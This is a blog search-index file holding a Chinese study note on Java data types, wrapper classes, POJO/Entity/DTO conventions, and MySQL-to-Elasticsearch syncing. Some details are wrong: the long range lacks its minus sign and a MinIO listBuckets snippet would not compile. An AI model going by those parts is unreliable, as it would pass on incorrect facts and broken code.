<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>笔记：Java 数据类型</title>
    <link href="/2025/06/30/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/06/30/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<blockquote><p>[!NOTE] 注意事项</p><ol><li>与数据库表映射的类通常称为 Entity 类，也可称为 DO 类或 PO 类，统属 POJO 类，通常只包含 getter、setter 、equals、hashCode、toString 方法及构造方法，不应包含业务逻辑方法</li><li>数据库中的表名一般使用复数形式，如 users；而在 Java 中则采用单数形式命名，如 User</li><li>别忘了添加 <code>private List&lt;String&gt; authorities;</code> 及其对应方法</li><li>使用 MyBatisX 插件生成的 POJO 类默认包含 getter、setter、equals、hashCode、toString 方法，但不包含构造方法。<ol><li>我们可以手动补全有参和无参构造方法；</li><li>同时我么也也可以删除自动生成的 equals、hashCode、toString 方法，改为使用 IDEA 生成</li></ol></li></ol></blockquote><h2 id="导图"><a href="#导图" class="headerlink" title="导图"></a>导图</h2><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/Map%EF%BC%9AJava%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.xmind"></p><hr><h3 id="4-Java-数据类型"><a href="#4-Java-数据类型" class="headerlink" title="4. Java 数据类型"></a>4. Java 数据类型</h3><h4 id="4-1-基本数据类型"><a href="#4-1-基本数据类型" class="headerlink" title="4.1. 基本数据类型"></a>4.1. 基本数据类型</h4><table><thead><tr><th>名称</th><th>范围</th><th>描述</th><th>默认值</th><th>赋值示例</th></tr></thead><tbody><tr><td><strong>数值类型</strong></td><td></td><td></td><td></td><td></td></tr><tr><td><code>byte</code></td><td>1字节，-128 ~ 127</td><td>小范围整数</td><td><code>0</code></td><td><code>byte b = 100;</code></td></tr><tr><td><code>short</code></td><td>2字节，-32,768 ~ 32,767</td><td>稍大范围整数</td><td><code>0</code></td><td><code>short s = 3000;</code></td></tr><tr><td><code>int</code></td><td>4字节，-2³¹ ~ 2³¹-1</td><td>常规整数</td><td><code>0</code></td><td><code>int i = 1000000;</code></td></tr><tr><td><code>long</code></td><td>8字节，2⁶³ ~ 2⁶³-1</td><td>非常大的证书</td><td><code>0L</code></td><td><code>long l = 9876543210L;</code></td></tr><tr><td><code>float</code></td><td>4字节，7 位十进制精度</td><td>常规浮点数，单精度，精度较低</td><td><code>0.0f</code></td><td><code>float f = 3.14f;</code></td></tr><tr><td><code>double</code></td><td>8字节，15 ~ 16 位十进制精度</td><td>双精度浮点数，精度高，适合科学计算</td><td><code>0.0d</code></td><td><code>double d = 0.00004567;</code></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>字符类型</strong></td><td></td><td></td><td></td><td></td></tr><tr><td><code>char</code></td><td>2字节</td><td>单个字符或ASCII码</td><td><code>\u0000</code></td><td><code>char c = &#39;A&#39;;</code></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>字符串类型</strong></td><td></td><td></td><td></td><td></td></tr><tr><td><code>String</code></td><td></td><td>可变长度</td><td><code>null</code></td><td><code>String s = &quot;Java&quot;;</code></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>布尔类型</strong></td><td></td><td></td><td></td><td></td></tr><tr><td><code>boolean</code></td><td>1字节，true、false</td><td></td><td></td><td><code>boolean flag = true;</code></td></tr></tbody></table><hr><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arcade">        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-built_in">Random</span> <span class="hljs-built_in">random</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Random</span>(); <span class="hljs-comment">// 创建一个随机数生成器</span><br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++) &#123;<br>            sb.append(<span class="hljs-built_in">random</span>.nextInt(<span class="hljs-number">10</span>));<br>        &#125;<br><br><br><br><br>- <span class="hljs-string">`StringBuilder`</span> 是一个可变字符串容器，用来高效地拼接字符串。<br>    <br>- 比 <span class="hljs-string">`String`</span> 拼接性能更好，适合在循环中反复追加内容。<br></code></pre></td></tr></table></figure><h4 id="4-2-类（Class-层）"><a href="#4-2-类（Class-层）" class="headerlink" title="4.2. 类（Class 层）"></a>4.2. 类（Class 层）</h4><h5 id="4-2-1-具体类"><a href="#4-2-1-具体类" class="headerlink" title="4.2.1. 具体类"></a>4.2.1. 具体类</h5><h6 id="4-2-1-1-普通类"><a href="#4-2-1-1-普通类" class="headerlink" title="4.2.1.1. 普通类"></a>4.2.1.1. 普通类</h6><h6 id="4-2-1-2-包装类"><a href="#4-2-1-2-包装类" class="headerlink" title="4.2.1.2. 包装类"></a>4.2.1.2. 包装类</h6><p>Java 是一门面向对象的语言，但它的基本数据类型（如 <code>int</code>、<code>char</code> 等）并不是对象。为了让这些基本类型也能在需要“对象”的场景中使用，Java 提供了对应的包装类。</p><p>包装类是为基本类型提供了“对象化”的封装，使它们能够享受面向对象编程的各种特性和便利。</p><table><thead><tr><th>基本类型</th><th>包装类</th></tr></thead><tbody><tr><td>int</td><td>Integer</td></tr><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>double</td><td>Double</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>byte</td><td>Byte</td></tr></tbody></table><p>而包装类有以下几大好处：</p><p>&#x3D;&#x3D;1.可以存入集合中&#x3D;&#x3D;<br>Java 的 <strong>集合框架（如 List、Map）只能处理对象</strong>，不能直接装基本类型。使用包装类就可以存入集合中，这就是包装类最直接的作用</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">List</span>&lt;int&gt; list <span class="hljs-operator">=</span> new <span class="hljs-type">ArrayList</span>&lt;&gt;();           <span class="hljs-comment">// ❌ 编译不通过</span><br><br><span class="hljs-type">List</span>&lt;<span class="hljs-type">Integer</span>&gt; list <span class="hljs-operator">=</span> new <span class="hljs-type">ArrayList</span>&lt;&gt;();       <span class="hljs-comment">// ✅ 包装成对象就能进来了</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.拥有更多的方法&#x3D;&#x3D;</p><p>&#x3D;&#x3D;3.支持 null 值&#x3D;&#x3D;<br>这在实际开发中特别有用，比如 ORM 映射数据库字段时，你也不确定数据库里到底有没有这个值，会不会是 null。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;              <span class="hljs-comment">// ❌ 编译错误，基本类型不能为 null</span><br><span class="hljs-type">Integer</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;          <span class="hljs-comment">// ✅ 包装类可以</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.自动装箱 &#x2F; 拆箱&#x3D;&#x3D;</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-keyword">Integer</span> a = <span class="hljs-number">10</span>;           // 自动装箱 <span class="hljs-built_in">int</span> -&gt; <span class="hljs-keyword">Integer</span><br><span class="hljs-built_in">int</span> b = a + <span class="hljs-number">5</span>;            // 自动拆箱 <span class="hljs-keyword">Integer</span> -&gt; <span class="hljs-built_in">int</span><br></code></pre></td></tr></table></figure><hr><h6 id="4-2-1-3-POJO-类"><a href="#4-2-1-3-POJO-类" class="headerlink" title="4.2.1.3. POJO 类"></a>4.2.1.3. POJO 类</h6><p><strong>POJO 类（Plain Old Java Object）</strong> 全称为 “普通的老式 Java 对象”，这个术语最早是为对抗 EJB（臃肿的企业 Java Bean）而提出的，旨在回归简单、纯粹的 Java 编程风格</p><p>其特点如下：</p><ol><li>不继承任何特定的父类</li><li>不实现特定的接口</li><li>不包含业务逻辑或复杂方法</li><li>仅包含字段（属性）、构造方法（无参构造、有参构造）、Getter&#x2F;Setter 方法、toString 等基本方法</li></ol><p>这种类通常用于数据封装与传递，可以简单理解为：“它啥也不干，只负责<strong>装数据</strong>、<strong>传递数据</strong>”。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><br>    <span class="hljs-comment">// 1. 私有属性（建议使用包装类）</span><br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> firstName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> lastName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> email;<br><br>  <span class="hljs-comment">// 2. 构造方法（无参构造、有参构造）</span><br>    <br>    <span class="hljs-comment">// 3. Getter 方法</span><br>    <br>    <span class="hljs-comment">// 4. Setter 方法</span><br>    <br>    <span class="hljs-comment">// 5. toString 方法</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="4-2-2-抽象类"><a href="#4-2-2-抽象类" class="headerlink" title="4.2.2. 抽象类"></a>4.2.2. 抽象类</h5><hr><h4 id="4-3-接口（Interfaces）"><a href="#4-3-接口（Interfaces）" class="headerlink" title="4.3. 接口（Interfaces）"></a>4.3. 接口（Interfaces）</h4><hr><h4 id="4-4-数组（Array）"><a href="#4-4-数组（Array）" class="headerlink" title="4.4. 数组（Array）"></a>4.4. 数组（Array）</h4><p>Array 是 Java 中的原生数组，语法简洁，性能高效，常用于处理元素个数固定、类型一致的集合。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-comment">// 1. 创建固定长度的空数组</span><br><span class="hljs-comment">// 1.1. 模板</span><br>T[] arrayName = <span class="hljs-keyword">new</span> T[n];<br><span class="hljs-comment">// 1.2. 示例</span><br><span class="hljs-type">int</span>[] nums = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">5</span>];<br><br><span class="hljs-comment">// 2. 创建并初始化的数组（固定长度）</span><br><span class="hljs-type">String</span>[] names = &#123;<span class="hljs-string">&quot;Tom&quot;</span>, <span class="hljs-string">&quot;Jerry&quot;</span>, <span class="hljs-string">&quot;Spike&quot;</span>&#125;;<br></code></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>是否有序</th><th>是否允许元素重复</th><th>是否支持随机访问</th><th>长度是否固定</th><th>增删效率</th><th>查找效率</th><th>类型限制</th></tr></thead><tbody><tr><td>Array</td><td>✅ 有序</td><td>✅ 允许</td><td>✅ 支持</td><td>✅ 是</td><td>❌ 慢</td><td>✅ 快</td><td>只要类型相同，Java 所有数据类型都可以，无限制</td></tr></tbody></table><hr><h4 id="4-5-集合框架"><a href="#4-5-集合框架" class="headerlink" title="4.5. 集合框架"></a>4.5. 集合框架</h4><h5 id="4-5-1-集合框架一览图"><a href="#4-5-1-集合框架一览图" class="headerlink" title="4.5.1. 集合框架一览图"></a>4.5.1. 集合框架一览图</h5><p><img src="/mermaid-202556%20182836.png"></p><hr><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/listBuckets&quot;</span>)  <br><span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; <span class="hljs-title function_">listBuckets</span>(<span class="hljs-params"></span>) &#123;  <br>    <span class="hljs-keyword">try</span> &#123;  <br>        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; buckets = minioClient.<span class="hljs-title function_">listBuckets</span>().<span class="hljs-title function_">forEach</span>(  <br>                e -&gt; &#123;  <br>                    <span class="hljs-keyword">return</span> e.<span class="hljs-title function_">name</span>() + <span class="hljs-string">&quot;---&quot;</span> + e.<span class="hljs-title function_">creationDate</span>();  <br>                &#125;  <br>        );  <br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) &#123;  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseStatusException</span>(  <br>            <span class="hljs-title class_">HttpStatus</span>.<span class="hljs-property">INTERNAL_SERVER_ERROR</span>, <span class="hljs-string">&quot;列出存储桶时出错: &quot;</span> + e.<span class="hljs-title function_">getMessage</span>(), e  <br>        );  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>特性</th><th>Array</th><th>List (<code>ArrayList</code>)</th><th>Set (<code>HashSet</code>)</th><th>Queue (<code>LinkedList</code>)</th></tr></thead><tbody><tr><td>是否有序</td><td>✅ 有序</td><td>✅ 有序</td><td>❌ 无序（HashSet）</td><td>✅ 有序（按入队顺序）</td></tr><tr><td>是否允许重复</td><td>✅ 允许</td><td>✅ 允许</td><td>❌ 不允许</td><td>✅ 允许</td></tr><tr><td>是否支持随机访问</td><td>✅ 支持</td><td>✅ 支持</td><td>❌ 不支持</td><td>❌ 不支持</td></tr><tr><td>是否固定大小</td><td>✅ 是</td><td>❌ 否（可动态扩容）</td><td>❌ 否</td><td>❌ 否</td></tr><tr><td>增删效率</td><td>❌ 慢</td><td>中等（尾部快）</td><td>✅ 快（哈希结构）</td><td>✅ 快（链表结构）</td></tr><tr><td>查找效率</td><td>✅ 快</td><td>✅ 快</td><td>✅ 快（哈希结构）</td><td>❌ 慢（需遍历）</td></tr><tr><td>典型用途</td><td>小数据、高性能</td><td>通用容器</td><td>去重、集合操作</td><td>排队、异步任务处理</td></tr></tbody></table><h3 id="MySQL-ES"><a href="#MySQL-ES" class="headerlink" title="MySQL -&gt; ES"></a>MySQL -&gt; ES</h3><p>在将 MySQL 数据同步至 Elasticsearch 时，索引字段的数据类型设计可参考上文的类型映射，但需特别注意以下几点：</p><ol><li>MySQL 中的 ID 字段在 ES 中通常作为文档的 <code>_id</code> 使用（即 <code>/_doc/&lt;文档 ID&gt;</code>）。若需在文档中保留该字段，应将其定义为 <code>keyword</code> 类型，尽管在 MySQL 中其为 <code>int</code> 类型。</li><li>若 MySQL 中的字符串字段用于存储地理位置信息，应在 ES 中对应设置为 <code>geo_point</code> 或 <code>geo_shape</code> 类型。</li></ol><p>就是注意这个id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">sync_to_es</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 1. 定义 MySQL 表名与 ES 索引名的映射</span><br>    table_map = &#123;<br>        <span class="hljs-string">&#x27;medical&#x27;</span>:   (<span class="hljs-string">&#x27;medical_docs&#x27;</span>,   <span class="hljs-string">&#x27;medical&#x27;</span>),<br>        <span class="hljs-string">&#x27;education&#x27;</span>: (<span class="hljs-string">&#x27;education_docs&#x27;</span>, <span class="hljs-string">&#x27;education&#x27;</span>),<br>        <span class="hljs-string">&#x27;tech&#x27;</span>:      (<span class="hljs-string">&#x27;tech_docs&#x27;</span>,      <span class="hljs-string">&#x27;tech&#x27;</span>)<br>    &#125;<br>    mysql_table, es_index = table_map[<span class="hljs-variable language_">self</span>.category]<br><br>    <span class="hljs-comment"># 2. 从 MySQL 读取 id, title, content</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-variable language_">self</span>.conn.cursor() <span class="hljs-keyword">as</span> cursor:<br>        cursor.execute(<span class="hljs-string">f&quot;SELECT id, title, content FROM <span class="hljs-subst">&#123;mysql_table&#125;</span>&quot;</span>)<br>        rows = cursor.fetchall()<br><br>    <span class="hljs-comment"># 3. 构建 bulk actions，同步到对应索引</span><br>    actions = [<br>        &#123;<br>            <span class="hljs-string">&quot;_index&quot;</span>: es_index,<br>            <span class="hljs-string">&quot;_id&quot;</span>:    row[<span class="hljs-number">0</span>],                    <span class="hljs-comment"># 用 MySQL 自增 ID 做 ES _id</span><br>            <span class="hljs-string">&quot;_source&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;title&quot;</span>:   row[<span class="hljs-number">1</span>],<br>                <span class="hljs-string">&quot;content&quot;</span>: row[<span class="hljs-number">2</span>]<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rows<br>    ]<br><br>    <span class="hljs-comment"># 4. 执行 bulk 同步</span><br>    bulk(<span class="hljs-variable language_">self</span>.es, actions)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;已同步 <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(actions)&#125;</span> 条记录到 Elasticsearch 索引 `<span class="hljs-subst">&#123;es_index&#125;</span>`&quot;</span>)<br><br></code></pre></td></tr></table></figure><hr><h1 id="Java-数据类型"><a href="#Java-数据类型" class="headerlink" title="Java 数据类型"></a>Java 数据类型</h1><p><img src="/image-20250519204423459.png"></p><table><thead><tr><th>基本类型</th><th>包装类</th></tr></thead><tbody><tr><td><code>int</code></td><td><code>Integer</code></td></tr><tr><td><code>boolean</code></td><td><code>Boolean</code></td></tr><tr><td><code>char</code></td><td><code>Character</code></td></tr><tr><td><code>double</code></td><td><code>Double</code></td></tr><tr><td><code>long</code></td><td><code>Long</code></td></tr><tr><td><code>float</code></td><td><code>Float</code></td></tr><tr><td><code>short</code></td><td><code>Short</code></td></tr><tr><td><code>byte</code></td><td><code>Byte</code></td></tr></tbody></table><p>在 Java 开发中，类的分类并不是语言层面强制规定的，而是根据 <strong>使用场景</strong> 和 <strong>命名习惯</strong> 演化出来的一种约定俗成的“分类法”。我们常听到的有：</p><ul><li><p>普通类（普通 Java 类）</p></li><li><p>POJO 类（Plain Old Java Object）</p></li><li><p>Entity 类（实体类）</p></li><li><p>DTO、VO、BO 等类（各类传输对象）</p></li></ul><p>下面我就用一个你喜欢的风格，来系统讲讲它们之间的区别和联系：</p><hr><h2 id="🧱-一、普通类（普通-Java-类）"><a href="#🧱-一、普通类（普通-Java-类）" class="headerlink" title="🧱 一、普通类（普通 Java 类）"></a>🧱 一、普通类（普通 Java 类）</h2><p>这是 Java 中最基础的类，没有特别的限制或用途，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>        <span class="hljs-keyword">return</span> a + b;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>👉 <strong>特点</strong>：可能有逻辑、有状态、有行为。</p></li><li><p>✅ <strong>适用场景</strong>：工具类、业务逻辑类、服务类等。</p></li><li><p>💬 你可以把它想象成啥事都能干的“全能战士”。</p></li></ul><hr><h2 id="🍞-二、POJO-类（Plain-Old-Java-Object）"><a href="#🍞-二、POJO-类（Plain-Old-Java-Object）" class="headerlink" title="🍞 二、POJO 类（Plain Old Java Object）"></a>🍞 二、POJO 类（Plain Old Java Object）</h2><p>POJO 的全称是「普通的老式 Java 对象」，这个词是为对抗 EJB（臃肿的企业 Java Bean）而提出的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-comment">// get、set 方法...</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>👉 <strong>特点</strong>：只有字段（属性）和 getter&#x2F;setter 方法，没有继承特定类、没有实现特定接口。</p></li><li><p>✅ <strong>适用场景</strong>：表示数据结构，常用作 <strong>数据传输对象</strong>。</p></li><li><p>💬 可以理解为“啥也不干，只负责装数据的小布袋”。</p></li></ul><hr><h2 id="🧩-三、Entity-类（实体类）"><a href="#🧩-三、Entity-类（实体类）" class="headerlink" title="🧩 三、Entity 类（实体类）"></a>🧩 三、Entity 类（实体类）</h2><p>Entity（实体）类，是 POJO 的一个特化版本，<strong>专门用于 ORM（如 JPA &#x2F; Hibernate）与数据库表映射</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Entity</span><br><span class="hljs-meta">@Table(name = &quot;users&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserEntity</span> &#123;<br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-meta">@GeneratedValue</span><br>    <span class="hljs-keyword">private</span> Long id;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>👉 <strong>特点</strong>：</p><ul><li><p>通常用 <code>@Entity</code>、<code>@Table</code>、<code>@Id</code> 等注解标注；</p></li><li><p>和数据库表是一一对应的；</p></li></ul></li><li><p>✅ <strong>适用场景</strong>：数据持久化操作（数据库映射）</p></li><li><p>💬 就像“数据库里的人，在 Java 世界的形象”。</p></li></ul><hr><h2 id="📦-四、DTO、VO、BO、DO-等（顺带提一下）"><a href="#📦-四、DTO、VO、BO、DO-等（顺带提一下）" class="headerlink" title="📦 四、DTO、VO、BO、DO 等（顺带提一下）"></a>📦 四、DTO、VO、BO、DO 等（顺带提一下）</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-comment">// 登录请求 DTO</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginRequest</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> password;<br><br>    <span class="hljs-comment">// getter 和 setter</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> username; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setUsername</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> username</span>) &#123; <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span> = username; &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getPassword</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> password; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setPassword</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> password</span>) &#123; <span class="hljs-variable language_">this</span>.<span class="hljs-property">password</span> = password; &#125;<br>&#125;<br><br><span class="hljs-comment">// 登录响应 DTO</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginResponse</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> message;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">String</span> username;<br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; authorities;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">LoginResponse</span>(<span class="hljs-title class_">String</span> message, <span class="hljs-title class_">String</span> username, <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; authorities) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">message</span> = message;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span> = username;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">authorities</span> = authorities;<br>    &#125;<br><br>    <span class="hljs-comment">// getter</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getMessage</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> message; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUsername</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> username; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Collection</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; <span class="hljs-title function_">getAuthorities</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-keyword">return</span> authorities; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这些都是架构层面的“角色分类”，虽然本质上也是 POJO，但各自的职责不同：</p><table><thead><tr><th>类名</th><th>全称</th><th>用途&#x2F;职责</th></tr></thead><tbody><tr><td>DTO</td><td>Data Transfer Object</td><td>用于前后端或服务间传输数据</td></tr><tr><td>VO</td><td>View Object</td><td>表示视图层展示的数据结构</td></tr><tr><td>BO</td><td>Business Object</td><td>表示业务逻辑中的对象</td></tr><tr><td>DO</td><td>Data Object</td><td>数据库中的数据对象，基本等于 Entity</td></tr><tr><td>PO</td><td>Persistent Object</td><td>与数据库表对应的持久化对象（&#x3D;Entity）</td></tr></tbody></table><p>💬 这些可以理解为一个公司里的不同岗位人员：DTO 是快递员，VO 是展示小姐姐，Entity 是档案馆员工……</p><hr><h2 id="🎯-总结一下区别（通俗表格版）"><a href="#🎯-总结一下区别（通俗表格版）" class="headerlink" title="🎯 总结一下区别（通俗表格版）"></a>🎯 